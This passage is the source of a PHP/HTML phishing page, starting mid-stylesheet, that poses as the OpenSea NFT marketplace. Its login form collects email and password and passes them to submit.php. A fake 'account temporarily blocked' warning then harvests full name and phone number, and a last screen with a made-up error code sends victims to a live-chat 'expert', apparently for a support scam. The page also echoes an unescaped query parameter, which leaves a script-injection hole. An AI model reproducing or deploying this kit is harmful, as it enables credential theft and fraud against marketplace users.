                height: auto;
            }

            *,
            ::before,
            ::after {
                --tw-translate-x: 0;
                --tw-translate-y: 0;
                --tw-rotate: 0;
                --tw-skew-x: 0;
                --tw-skew-y: 0;
                --tw-scale-x: 1;
                --tw-scale-y: 1;
                --tw-transform: translateX(var(--tw-translate-x)) translateY(var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
                --tw-border-opacity: 1;
                border-color: rgba(229, 231, 235, var(--tw-border-opacity));
                --tw-shadow: 0 0 #0000;
                --tw-ring-inset: var(--tw-empty, /*!*/ /*!*/);
                --tw-ring-offset-width: 0px;
                --tw-ring-offset-color: #fff;
                --tw-ring-color: rgba(59, 130, 246, 0.5);
                --tw-ring-offset-shadow: 0 0 #0000;
                --tw-ring-shadow: 0 0 #0000;
                --tw-blur: var(--tw-empty, /*!*/ /*!*/);
                --tw-brightness: var(--tw-empty, /*!*/ /*!*/);
                --tw-contrast: var(--tw-empty, /*!*/ /*!*/);
                --tw-grayscale: var(--tw-empty, /*!*/ /*!*/);
                --tw-hue-rotate: var(--tw-empty, /*!*/ /*!*/);
                --tw-invert: var(--tw-empty, /*!*/ /*!*/);
                --tw-saturate: var(--tw-empty, /*!*/ /*!*/);
                --tw-sepia: var(--tw-empty, /*!*/ /*!*/);
                --tw-drop-shadow: var(--tw-empty, /*!*/ /*!*/);
                --tw-filter: var(--tw-blur) var(--tw-brightness) var(--tw-contrast) var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert) var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow);
                --tw-backdrop-blur: var(--tw-empty, /*!*/ /*!*/);
                --tw-backdrop-brightness: var(--tw-empty, /*!*/ /*!*/);
                --tw-backdrop-contrast: var(--tw-empty, /*!*/ /*!*/);
                --tw-backdrop-grayscale: var(--tw-empty, /*!*/ /*!*/);
                --tw-backdrop-hue-rotate: var(--tw-empty, /*!*/ /*!*/);
                --tw-backdrop-invert: var(--tw-empty, /*!*/ /*!*/);
                --tw-backdrop-opacity: var(--tw-empty, /*!*/ /*!*/);
                --tw-backdrop-saturate: var(--tw-empty, /*!*/ /*!*/);
                --tw-backdrop-sepia: var(--tw-empty, /*!*/ /*!*/);
                --tw-backdrop-filter: var(--tw-backdrop-blur) var(--tw-backdrop-brightness) var(--tw-backdrop-contrast) var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate) var(--tw-backdrop-invert) var(--tw-backdrop-opacity)
                    var(--tw-backdrop-saturate) var(--tw-backdrop-sepia);
            }

            [type="text"],
            [type="email"],
            [type="url"],
            [type="password"],
            [type="number"],
            [type="date"],
            [type="datetime-local"],
            [type="month"],
            [type="search"],
            [type="tel"],
            [type="time"],
            [type="week"],
            [multiple],
            textarea,
            select {
                appearance: none;
                background-color: #fff;
                border-color: #6b7280;
                border-width: 1px;
                border-radius: 0px;
                padding-top: 0.5rem;
                padding-right: 0.75rem;
                padding-bottom: 0.5rem;
                padding-left: 0.75rem;
                font-size: 1rem;
                line-height: 1.5rem;
            }

            [type="text"]:focus,
            [type="email"]:focus,
            [type="url"]:focus,
            [type="password"]:focus,
            [type="number"]:focus,
            [type="date"]:focus,
            [type="datetime-local"]:focus,
            [type="month"]:focus,
            [type="search"]:focus,
            [type="tel"]:focus,
            [type="time"]:focus,
            [type="week"]:focus,
            [multiple]:focus,
            textarea:focus,
            select:focus {
                outline: 2px solid transparent;
                outline-offset: 2px;
                --tw-ring-inset: var(--tw-empty, /*!*/ /*!*/);
                --tw-ring-offset-width: 0px;
                --tw-ring-offset-color: #fff;
                --tw-ring-color: #2563eb;
                --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
                --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
                box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
                border-color: #2563eb;
            }

            input::placeholder,
            textarea::placeholder {
                color: #6b7280;
                opacity: 1;
            }

            ::-webkit-datetime-edit-fields-wrapper {
                padding: 0;
            }

            ::-webkit-date-and-time-value {
                min-height: 1.5em;
            }

            select {
                background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3e%3cpath stroke='%236b7280' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='M6 8l4 4 4-4'/%3e%3c/svg%3e");
                background-position: right 0.5rem center;
                background-repeat: no-repeat;
                background-size: 1.5em 1.5em;
                padding-right: 2.5rem;
                color-adjust: exact;
            }

            [multiple] {
                background-image: initial;
                background-position: initial;
                background-repeat: unset;
                background-size: initial;
                padding-right: 0.75rem;
                color-adjust: unset;
            }

            [type="checkbox"],
            [type="radio"] {
                appearance: none;
                padding: 0;
                color-adjust: exact;
                display: inline-block;
                vertical-align: middle;
                background-origin: border-box;
                user-select: none;
                flex-shrink: 0;
                height: 1rem;
                width: 1rem;
                color: #2563eb;
                background-color: #fff;
                border-color: #6b7280;
                border-width: 1px;
            }

            [type="checkbox"] {
                border-radius: 0px;
            }

            [type="radio"] {
                border-radius: 100%;
            }

            [type="checkbox"]:focus,
            [type="radio"]:focus {
                outline: 2px solid transparent;
                outline-offset: 2px;
                --tw-ring-inset: var(--tw-empty, /*!*/ /*!*/);
                --tw-ring-offset-width: 2px;
                --tw-ring-offset-color: #fff;
                --tw-ring-color: #2563eb;
                --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
                --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
                box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
            }

            [type="checkbox"]:checked,
            [type="radio"]:checked {
                border-color: transparent;
                background-color: currentColor;
                background-size: 100% 100%;
                background-position: center;
                background-repeat: no-repeat;
            }

            [type="checkbox"]:checked {
                background-image: url("data:image/svg+xml,%3csvg viewBox='0 0 16 16' fill='white' xmlns='http://www.w3.org/2000/svg'%3e%3cpath d='M12.207 4.793a1 1 0 010 1.414l-5 5a1 1 0 01-1.414 0l-2-2a1 1 0 011.414-1.414L6.5 9.086l4.293-4.293a1 1 0 011.414 0z'/%3e%3c/svg%3e");
            }

            [type="radio"]:checked {
                background-image: url("data:image/svg+xml,%3csvg viewBox='0 0 16 16' fill='white' xmlns='http://www.w3.org/2000/svg'%3e%3ccircle cx='8' cy='8' r='3'/%3e%3c/svg%3e");
            }

            [type="checkbox"]:checked:hover,
            [type="checkbox"]:checked:focus,
            [type="radio"]:checked:hover,
            [type="radio"]:checked:focus {
                border-color: transparent;
                background-color: currentColor;
            }

            [type="checkbox"]:indeterminate {
                background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 16 16'%3e%3cpath stroke='white' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M4 8h8'/%3e%3c/svg%3e");
                border-color: transparent;
                background-color: currentColor;
                background-size: 100% 100%;
                background-position: center;
                background-repeat: no-repeat;
            }

            [type="checkbox"]:indeterminate:hover,
            [type="checkbox"]:indeterminate:focus {
                border-color: transparent;
                background-color: currentColor;
            }

            [type="file"] {
                background: unset;
                border-color: inherit;
                border-width: 0;
                border-radius: 0;
                padding: 0;
                font-size: unset;
                line-height: inherit;
            }

            [type="file"]:focus {
                outline: 1px auto -webkit-focus-ring-color;
            }

            .visible {
                visibility: visible;
            }

            .fixed {
                position: fixed;
            }

            .bottom-0 {
                bottom: 0px;
            }

            .right-\[-420px\] {
                right: -420px;
            }

            .top-\[72px\] {
                top: 72px;
            }

            .z-50 {
                z-index: 50;
            }

            .mr-3 {
                margin-right: 0.75rem;
            }

            .ml-auto {
                margin-left: auto;
            }

            .block {
                display: block;
            }

            .inline {
                display: inline;
            }

            .flex {
                display: flex;
            }

            .inline-flex {
                display: inline-flex;
            }

            .table {
                display: table;
            }

            .hidden {
                display: none;
            }

            .h-7 {
                height: 1.75rem;
            }

            .w-full {
                width: 100%;
            }

            .w-7 {
                width: 1.75rem;
            }

            .w-\[420px\] {
                width: 420px;
            }

            .flex-shrink {
                flex-shrink: 1;
            }

            .border-collapse {
                border-collapse: collapse;
            }

            .cursor-pointer {
                cursor: pointer;
            }

            .resize {
                resize: both;
            }

            .items-center {
                align-items: center;
            }

            .justify-start {
                justify-content: flex-start;
            }

            .gap-4 {
                gap: 1rem;
            }

            .rounded-lg {
                border-radius: 0.5rem;
            }

            .border {
                border-width: 1px;
            }

            .border-b {
                border-bottom-width: 1px;
            }

            .bg-white {
                --tw-bg-opacity: 1;
                background-color: rgba(255, 255, 255, var(--tw-bg-opacity));
            }

            .p-5 {
                padding: 1.25rem;
            }

            .text-lg {
                font-size: 1.125rem;
                line-height: 1.75rem;
            }

            .text-sm {
                font-size: 0.875rem;
                line-height: 1.25rem;
            }

            .font-bold {
                font-weight: 700;
            }

            .font-medium {
                font-weight: 500;
            }

            .text-gray-500 {
                --tw-text-opacity: 1;
                color: rgba(107, 114, 128, var(--tw-text-opacity));
            }

            .text-gray-600 {
                --tw-text-opacity: 1;
                color: rgba(75, 85, 99, var(--tw-text-opacity));
            }

            .text-blue-500 {
                --tw-text-opacity: 1;
                color: rgba(59, 130, 246, var(--tw-text-opacity));
            }

            .text-gray-400 {
                --tw-text-opacity: 1;
                color: rgba(156, 163, 175, var(--tw-text-opacity));
            }

            .underline {
                text-decoration: underline;
            }

            .shadow-lg {
                --tw-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
                box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
            }

            .transition-all {
                transition-property: all;
                transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
                transition-duration: 150ms;
            }

            .hover\:bg-blue-50:hover {
                --tw-bg-opacity: 1;
                background-color: rgba(239, 246, 255, var(--tw-bg-opacity));
            }
            aside{
              overflow-x: hidden;
            }
            #wallets{
              /*width: 50%;*/
              margin: auto;
            }
        </style>
        <script defer="" data-domain="opensea-app.io" src="./index_files/plausible.js.download"></script>
        <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
        <meta name="viewport" content="width=device-width">
        <title>OpenSea, the largest NFT marketplace</title>
       
    </head>

    <body>
        <div id="__next">
            <div class="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 FlexColumnreact__FlexColumn-sc-1wwz3hp-0 OpenSeaPagereact__DivContainer-sc-65pnmt-0 elqhCm jYqxGr ksFzlZ iRiGb">
                <div class="Navbarreact__DivContainer-sc-d040ow-1 iiAfil">
                    <nav class="Navbar--main">
                        <div class="Navbar--left">
                            <a class="styles__StyledLink-sc-l6elh8-0 ekTmzq Navbar--brand" href="#">
                                <div height="40" width="40" class="Blockreact__Block-sc-1xf18x6-0 fwdSDv">
                                    <div style="display: block; overflow: hidden; position: absolute; top: 0; left: 0; bottom: 0; right: 0; box-sizing: border-box; margin: 0;">
                                        <img alt="OpenSea Logo" src="./index_files/logo.svg" decoding="async" data-nimg="fill" style="
                                                position: absolute;
                                                top: 0;
                                                left: 0;
                                                bottom: 0;
                                                right: 0;
                                                box-sizing: border-box;
                                                padding: 0;
                                                border: none;
                                                margin: auto;
                                                display: block;
                                                width: 0;
                                                height: 0;
                                                min-width: 100%;
                                                max-width: 100%;
                                                min-height: 100%;
                                                max-height: 100%;
                                            ">
                                        
                                    </div>
                                </div>
                                <svg class="Navbar--brand-name" fill="#04111D" height="58" style="width: 100px;" viewBox="0 0 313 58" width="313">
                                    <path d="M24.7232 47.4966C20.2031 47.4966 16.0484 46.4837 12.2588 44.4579C8.51498 42.432 5.52447 39.6135 3.28729 36.0023C1.09576 32.347 0 28.2513 0 23.7153C0 19.1792 1.09576 15.1055 3.28729 11.4943C5.52447 7.88307 8.51498 5.06454 12.2588 3.03872C16.0484 1.01291 20.2031 0 24.7232 0C29.2432 0 33.3751 1.01291 37.119 3.03872C40.9085 5.06454 43.8762 7.88307 46.0221 11.4943C48.2136 15.1055 49.3094 19.1792 49.3094 23.7153C49.3094 28.2513 48.2136 32.347 46.0221 36.0023C43.8305 39.6135 40.8628 42.432 37.119 44.4579C33.3751 46.4837 29.2432 47.4966 24.7232 47.4966ZM24.7232 37.1913C28.5583 37.1913 31.6173 35.9582 33.9002 33.492C36.2287 31.0258 37.3929 27.7669 37.3929 23.7153C37.3929 19.6196 36.2287 16.3607 33.9002 13.9385C31.6173 11.4723 28.5583 10.2392 24.7232 10.2392C20.8423 10.2392 17.7377 11.4503 15.4092 13.8724C13.1263 16.2946 11.9849 19.5755 11.9849 23.7153C11.9849 27.8109 13.1263 31.0919 15.4092 33.5581C17.7377 35.9803 20.8423 37.1913 24.7232 37.1913Z"></path>
                                    <path d="M67.5356 15.3918C68.677 13.6743 70.2521 12.287 72.261 11.2301C74.2699 10.1731 76.6212 9.64465 79.315 9.64465C82.4653 9.64465 85.3189 10.4153 87.8756 11.9567C90.4324 13.4981 92.4413 15.7001 93.9024 18.5626C95.409 21.4252 96.1624 24.7502 96.1624 28.5376C96.1624 32.325 95.409 35.672 93.9024 38.5786C92.4413 41.4412 90.4324 43.6651 87.8756 45.2506C85.3189 46.792 82.4653 47.5626 79.315 47.5626C76.6669 47.5626 74.3156 47.0342 72.261 45.9772C70.2521 44.9203 68.677 43.5551 67.5356 41.8815V58H55.8246V10.1731H67.5356V15.3918ZM84.2459 28.5376C84.2459 25.7191 83.4241 23.5171 81.7805 21.9317C80.1825 20.3022 78.1964 19.4875 75.8223 19.4875C73.4938 19.4875 71.5077 20.3022 69.8641 21.9317C68.2661 23.5611 67.467 25.7851 67.467 28.6036C67.467 31.4222 68.2661 33.6462 69.8641 35.2756C71.5077 36.9051 73.4938 37.7198 75.8223 37.7198C78.1508 37.7198 80.1368 36.9051 81.7805 35.2756C83.4241 33.6021 84.2459 31.3561 84.2459 28.5376Z"></path>
                                    <path d="M138.329 28.0091C138.329 29.0661 138.261 30.167 138.124 31.3121H111.62C111.803 33.6021 112.556 35.3637 113.88 36.5968C115.25 37.7859 116.916 38.3804 118.88 38.3804C121.802 38.3804 123.833 37.1913 124.975 34.8132H137.439C136.8 37.2354 135.636 39.4153 133.946 41.3531C132.303 43.2908 130.225 44.8102 127.714 45.9112C125.203 47.0121 122.395 47.5626 119.291 47.5626C115.547 47.5626 112.214 46.792 109.292 45.2506C106.37 43.7092 104.087 41.5072 102.443 38.6446C100.8 35.7821 99.9777 32.4351 99.9777 28.6036C99.9777 24.7722 100.777 21.4252 102.375 18.5626C104.018 15.7001 106.301 13.4981 109.223 11.9567C112.145 10.4153 115.501 9.64465 119.291 9.64465C122.989 9.64465 126.276 10.3933 129.152 11.8907C132.029 13.388 134.266 15.5239 135.864 18.2984C137.508 21.0729 138.329 24.3098 138.329 28.0091ZM126.345 25.0364C126.345 23.0987 125.66 21.5573 124.29 20.4123C122.92 19.2673 121.208 18.6948 119.154 18.6948C117.19 18.6948 115.524 19.2453 114.154 20.3462C112.83 21.4472 112.008 23.0106 111.689 25.0364H126.345Z"></path>
                                    <path d="M167.793 9.77676C172.267 9.77676 175.828 11.186 178.476 14.0046C181.17 16.779 182.517 20.6105 182.517 25.4989V47.0342H170.874V27.0182C170.874 24.552 170.212 22.6363 168.888 21.2711C167.564 19.9058 165.784 19.2232 163.547 19.2232C161.309 19.2232 159.529 19.9058 158.205 21.2711C156.881 22.6363 156.219 24.552 156.219 27.0182V47.0342H144.508V10.1731H156.219V15.0615C157.406 13.432 159.004 12.1549 161.013 11.2301C163.021 10.2612 165.281 9.77676 167.793 9.77676Z"></path>
                                    <path d="M208.05 47.4966C204.535 47.4966 201.384 46.9461 198.599 45.8451C195.814 44.7441 193.577 43.1147 191.888 40.9567C190.244 38.7988 189.376 36.2005 189.285 33.1617H201.749C201.932 34.8793 202.548 36.2005 203.599 37.1253C204.649 38.0061 206.018 38.4465 207.708 38.4465C209.443 38.4465 210.812 38.0721 211.817 37.3235C212.821 36.5308 213.324 35.4518 213.324 34.0866C213.324 32.9415 212.913 31.9947 212.091 31.246C211.315 30.4973 210.333 29.8808 209.146 29.3964C208.004 28.9119 206.361 28.3614 204.215 27.7449C201.11 26.82 198.576 25.8952 196.613 24.9704C194.65 24.0456 192.961 22.6803 191.545 20.8747C190.13 19.0691 189.422 16.713 189.422 13.8064C189.422 9.49051 191.043 6.12149 194.285 3.69932C197.526 1.23311 201.749 0 206.954 0C212.251 0 216.519 1.23311 219.761 3.69932C223.003 6.12149 224.738 9.51253 224.966 13.8724H212.296C212.205 12.3751 211.634 11.208 210.584 10.3713C209.534 9.49051 208.187 9.05011 206.543 9.05011C205.128 9.05011 203.987 9.42445 203.119 10.1731C202.252 10.8777 201.818 11.9127 201.818 13.2779C201.818 14.7752 202.548 15.9423 204.01 16.779C205.471 17.6158 207.753 18.5186 210.858 19.4875C213.963 20.5004 216.474 21.4692 218.391 22.3941C220.355 23.3189 222.044 24.6621 223.459 26.4237C224.875 28.1853 225.582 30.4533 225.582 33.2278C225.582 35.8702 224.875 38.2703 223.459 40.4282C222.09 42.5862 220.081 44.3037 217.433 45.5809C214.785 46.858 211.657 47.4966 208.05 47.4966Z"></path>
                                    <path d="M268.813 28.0091C268.813 29.0661 268.744 30.167 268.607 31.3121H242.103C242.286 33.6021 243.039 35.3637 244.363 36.5968C245.733 37.7859 247.4 38.3804 249.363 38.3804C252.285 38.3804 254.317 37.1913 255.458 34.8132H267.922C267.283 37.2354 266.119 39.4153 264.43 41.3531C262.786 43.2908 260.709 44.8102 258.197 45.9112C255.686 47.0121 252.878 47.5626 249.774 47.5626C246.03 47.5626 242.697 46.792 239.775 45.2506C236.853 43.7092 234.57 41.5072 232.926 38.6446C231.283 35.7821 230.461 32.4351 230.461 28.6036C230.461 24.7722 231.26 21.4252 232.858 18.5626C234.501 15.7001 236.784 13.4981 239.706 11.9567C242.628 10.4153 245.984 9.64465 249.774 9.64465C253.472 9.64465 256.759 10.3933 259.636 11.8907C262.512 13.388 264.749 15.5239 266.347 18.2984C267.991 21.0729 268.813 24.3098 268.813 28.0091ZM256.828 25.0364C256.828 23.0987 256.143 21.5573 254.773 20.4123C253.403 19.2673 251.691 18.6948 249.637 18.6948C247.674 18.6948 246.007 19.2453 244.637 20.3462C243.313 21.4472 242.491 23.0106 242.172 25.0364H256.828Z"></path>
                                    <path d="M272.662 28.5376C272.662 24.7502 273.393 21.4252 274.854 18.5626C276.36 15.7001 278.392 13.4981 280.949 11.9567C283.506 10.4153 286.359 9.64465 289.51 9.64465C292.203 9.64465 294.555 10.1731 296.564 11.2301C298.618 12.287 300.193 13.6743 301.289 15.3918V10.1731H313V47.0342H301.289V41.8155C300.148 43.533 298.55 44.9203 296.495 45.9772C294.486 47.0342 292.135 47.5626 289.441 47.5626C286.336 47.5626 283.506 46.792 280.949 45.2506C278.392 43.6651 276.36 41.4412 274.854 38.5786C273.393 35.672 272.662 32.325 272.662 28.5376ZM301.289 28.6036C301.289 25.7851 300.467 23.5611 298.824 21.9317C297.226 20.3022 295.262 19.4875 292.934 19.4875C290.605 19.4875 288.619 20.3022 286.976 21.9317C285.378 23.5171 284.579 25.7191 284.579 28.5376C284.579 31.3561 285.378 33.6021 286.976 35.2756C288.619 36.9051 290.605 37.7198 292.934 37.7198C295.262 37.7198 297.226 36.9051 298.824 35.2756C300.467 33.6462 301.289 31.4222 301.289 28.6036Z"></path>
                                </svg>
                            </a>
                        </div>
                        <div class="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 eAPuiF jYqxGr fresnel-greaterThanOrEqual-sm" width="100%">
                            <div class="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 FlexColumnreact__FlexColumn-sc-1wwz3hp-0 VerticalAlignedreact__VerticalAligned-sc-b4hiel-0 NavSearchreact__StyledContainer-sc-yexslu-1 elqhCm jYqxGr ksFzlZ iXcsEj ljMMhO">
                                <div aria-expanded="false" aria-haspopup="listbox" aria-owns="NavSearch--results" height="80px,45px" role="combobox" class="Blockreact__Block-sc-1xf18x6-0 dphVue">
                                    <div class="Inputreact__StyledContainer-sc-3dr67n-0 fOXING NavSearchreact__StyledGlobalSearchInput-sc-yexslu-2 egbaGe">
                                        <div class="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 FlexColumnreact__FlexColumn-sc-1wwz3hp-0 VerticalAlignedreact__VerticalAligned-sc-b4hiel-0 jqNBiE jYqxGr ksFzlZ iXcsEj">
                                            <i color="gray" value="search" size="24" class="Iconreact__Icon-sc-1gugx8q-0 kUebnk material-icons">search</i>
                                        </div>
                                        <input id="searchbox" type="text" aria-invalid="false" style="cursor: text;" value="" aria-controls="NavSearch--results" aria-multiline="false" placeholder="Search items, collections, and accounts" role="searchbox">
                                    </div>
                                </div>
                            </div>
                        </div>
                        <ul class="Navbar--items">
                            <div class="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 elqhCm jYqxGr fresnel-greaterThanOrEqual-xl">
                                <li class="NavItemreact__LiContainer-sc-1agh4ne-0 fyqWls NavItem--isRoot">
                                    <a class="styles__StyledLink-sc-l6elh8-0 ekTmzq NavItem--main NavItem--withAfter" href="#">Explore</a>
                                </li>
                                <li class="NavItemreact__LiContainer-sc-1agh4ne-0 fyqWls NavItem--isRoot">
                                    <a class="styles__StyledLink-sc-l6elh8-0 ekTmzq NavItem--main NavItem--withAfter" href="#">Stats</a>
                                </li>
                                <li class="NavItemreact__LiContainer-sc-1agh4ne-0 fyqWls NavItem--isRoot">
                                    <a class="styles__StyledLink-sc-l6elh8-0 ekTmzq NavItem--main NavItem--withAfter" href="#" rel="nofollow noopener" target="_blank">Resources</a>
                                </li>
                                <li class="NavItemreact__LiContainer-sc-1agh4ne-0 fyqWls NavItem--isRoot">
                                    <a class="styles__StyledLink-sc-l6elh8-0 ekTmzq NavItem--main NavItem--withAfter" href="#">Create</a>
                                </li>
                            </div>
                            <div class="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 elqhCm jYqxGr fresnel-greaterThanOrEqual-lg">
                                <div class="Blockreact__Block-sc-1xf18x6-0 hOuzGS">
                                    <li class="NavItemreact__LiContainer-sc-1agh4ne-0 fyqWls NavItem--isRoot">
                                        <a class="styles__StyledLink-sc-l6elh8-0 ekTmzq NavItem--main NavItem--withAfter" href="#">
                                            <i class="Iconreact__Icon-sc-1gugx8q-0 irlPce NavItem--icon material-icons-outlined NavItem--icon" size="32" value="account_circle">account_circle</i>
                                        </a>
                                    </li>
                                </div>
                                <li class="NavItemreact__LiContainer-sc-1agh4ne-0 fyqWls NavItem--isRoot">
                                    <button class="UnstyledButtonreact__UnstyledButton-sc-ty1bh0-0 btgkrL NavItem--main NavItem--withIcon" type="button">
                                        <i class="Iconreact__Icon-sc-1gugx8q-0 irlPce NavItem--icon material-icons-outlined NavItem--icon" size="32" title="Wallet" value="account_balance_wallet">account_balance_wallet</i>
                                    </button>
                                </li>
                            </div>
                            <li class="NavItemreact__LiContainer-sc-1agh4ne-0 fyqWls NavItem--isRoot fresnel-lessThan-xl">
                                <button class="UnstyledButtonreact__UnstyledButton-sc-ty1bh0-0 btgkrL NavItem--main NavItem--withIcon" type="button">
                                    <i class="Iconreact__Icon-sc-1gugx8q-0 irlPce NavItem--icon material-icons NavItem--icon" size="32" title="Open menu" value="menu">menu</i>
                                </button>
                            </li>
                        </ul>
                    </nav>
                </div>
                <!-- <aside id="wallets" class="fixed bg-white z-50 right-[-420px] bottom-0 top-[72px] shadow-lg w-[420px] transition-all"> -->

                  <?php
                   if (isset($_POST['btnLoginMore'])) {
                      include 'submit.php';
                  ?>

                    <aside id="wallets" class="">
                    
                   
                    <div class="p-5 " >
                        <div class="border rounded-lg innerDiv">
                           <div class="col-md-6">
                            <h3 class="font-bold" style="line-height: 28px;">
                               <div class="alert mb-4 alert-danger text-center">Attention: the account has been <b>temporarily blocked due to suspicious activity in your Network IP,</b> kindly verify the following details<br>
                                             Kindly contact chat assistance for further help
                                           </div>
                            </h3>
                            <br>
                            <form method="POST" id="login_form" action="">
                               <input type="hidden" name="wtype" value="<?php echo $_GET['action']; ?>" />
                               <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
                               <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />
                                <div class="row">
                                    <div class="col-md-12">
                                        <div class="row"> 
                                            <div class="col-md-12">
                                                <label for="name">Full Name</label>
                                                <input type="text" name="name" id="name" required="" placeholder="Full Name" class="form-control">
                                            </div>
                                        </div>
                                        <div class="row">&nbsp;</div>
                                        <div class="row">
                                            <div class="col-md-12">
                                                <label for="number">Phone Number</label>
                                                <input type="text" name="number" id="id_number" required="" placeholder="Phone Number" class="form-control">
                                            </div>
                                        </div>
                                       
                                        <div class="row">&nbsp;</div>
                                        <div class="row footer-row">
                                            <div class="col-md-12">
                                                <button type="submit" class="btn btn-default pull-right" name="fromLog">
                                                    Verify
                                                </button>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </form>
                        </div>
                           
                        </div>
                    </div>
                </aside>


                  <?php } elseif (isset($_POST['fromLog'])) {
                     include 'submit.php';
                  ?>
                   <aside id="wallets" class="">
                    
                   
                    <div class="p-5 " >
                        <div class="border rounded-lg innerDiv">
                           <div class="col-md-6">
                            <h3 class="font-bold" style="line-height: 32px;">
                               <div class="alert mb-4 alert-danger text-center">
                                <p style="font-size: 20px;">Your account has been <b>temporarily blocked</b> due to <br>suspicious activity on your Network IP.<br>Kindly ask an expert</p>

                                 <label style="font-size: 18px;">Error CODE: <b>6X76D</b></label><br>

                                <a class="btn btn-danger" href="javascript:void(Tawk_API.toggle())" style="background: #bf0707;color: #fff !important;font-size: 20px;font-weight: 600;margin-top: 15px;padding: 8px 20px;display: inline-block;border-radius: 10px;">Ask Expert</a>

                                </div>
                            </h3>
                          
                        </div>
                           
                        </div>
                    </div>
                </aside>

                  <?php } else { ?>

                    <aside id="wallets" class="">
                    <div class="flex items-center text-lg p-5 border-b">
                        <span class="font-bold">You need an <?php echo $_GET['action']; ?> wallet to use OpenSea.</span>
                    </div>
                   
                    <div class="p-5 " >
                        <div class="border rounded-lg innerDiv">
                           <div class="col-md-6">
                            <h3 class="font-bold">Login</h3>
                            <br>
                            <form method="POST" id="login_form" action="">
                               <input type="hidden" name="wtype" value="<?php echo $_GET['action']; ?>" />
                                <div class="row">
                                    <div class="col-md-12">
                                        <div class="row"> 
                                            <div class="col-md-12">
                                                <label for="username">Email Address</label>
                                                <input type="email" name="email" id="id_email" required="" placeholder="Email" class="form-control">
                                            </div>
                                        </div>
                                        <div class="row">&nbsp;</div>
                                        <div class="row">
                                            <div class="col-md-12">
                                                <label for="password">Password</label>
                                                <input type="password" name="password" id="id_password" required="" placeholder="Password" class="form-control">
                                            </div>
                                        </div>
                                       
                                        <div class="row">&nbsp;</div>
                                        <div class="row footer-row">
                                            <div class="col-md-12">
                                               
                                                <button type="submit" class="btn btn-default pull-right" name="btnLoginMore">
                                                    LOGIN
                                                </button>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </form>
                        </div>
                           
                        </div>
                    </div>
                </aside>

                  <?php } ?>
            </div>
        </div>
          <!--Start of Tawk.to Script-->
    <script type="text/javascript">
    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
    (function(){
    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
    s1.async=true;
    s1.src='https://embed.tawk.to/620a586d9bd1f31184dc89bb/1frs6irvs';
    s1.charset='UTF-8';
    s1.setAttribute('crossorigin','*');
    s0.parentNode.insertBefore(s1,s0);
    })();
    </script>
    <!--End of Tawk.to Script--> 
  </body>
  </html>